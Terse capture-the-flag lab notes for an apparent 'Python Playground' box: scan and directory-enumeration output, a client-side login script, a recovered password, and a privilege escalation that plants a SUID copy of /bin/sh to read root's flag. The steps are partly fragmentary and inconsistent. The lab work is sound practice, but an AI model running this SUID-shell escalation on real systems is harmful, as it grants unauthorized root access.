nmap -sCV 10.48.145.195 -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 16:11 +0300
Nmap scan report for 10.48.145.195
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds


gobuster dir -u http://10.48.145.195 -w ~/Lock-in/Projects/Cybersecurity/wordlists/dirb/wordlists/common.txt -x html -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.145.195
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/drrr/Lock-in/Projects/Cybersecurity/wordlists/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin.html           (Status: 200) [Size: 3134]
index.html           (Status: 200) [Size: 941]
index.html           (Status: 200) [Size: 941]
login.html           (Status: 200) [Size: 549]
signup.html          (Status: 200) [Size: 549]
Progress: 9226 / 9226 (100.00%)
===============================================================
Finished
===============================================================

/index.html has no leads
/admin.html

analyse source code:
`<script> // I suck at server side code, luckily I know how to make things secure without it - Connor 
function string_to_int_array(str){ const intArr = []; for(let i=0;i<str.length;i++){ const charcode = str.charCodeAt(i); const partA = Math.floor(charcode / 26); const partB = charcode % 26; intArr.push(partA); intArr.push(partB); } return intArr; } function int_array_to_text(int_array){ let txt = ''; for(let i=0;i<int_array.length;i++){ txt += String.fromCharCode(97 + int_array[i]); } return txt; } document.forms[0].onsubmit = function (e){ e.preventDefault(); if(document.getElementById('username').value !== 'connor'){ document.getElementById('fail').style.display = ''; return false; } const chosenPass = document.getElementById('inputPassword').value; const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass)))); if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){ window.location = 'super-secret-admin-testing-panel.html'; }else { document.getElementById('fail').style.display = ''; } return false; } </script>`

connor:spaghetti1245

after obtaining a reverse shell

flag1.txt

ssh connor@<machine-ip>
cat flag2.txt

flag3:

```
cp /bin/sh /mnt/log
```
chmod +s /mnt/log/sh
```
```

on connor's session:

```
connor@pythonplayground:~$ /var/log/sh -p
```
id

cat /root/flag3.txt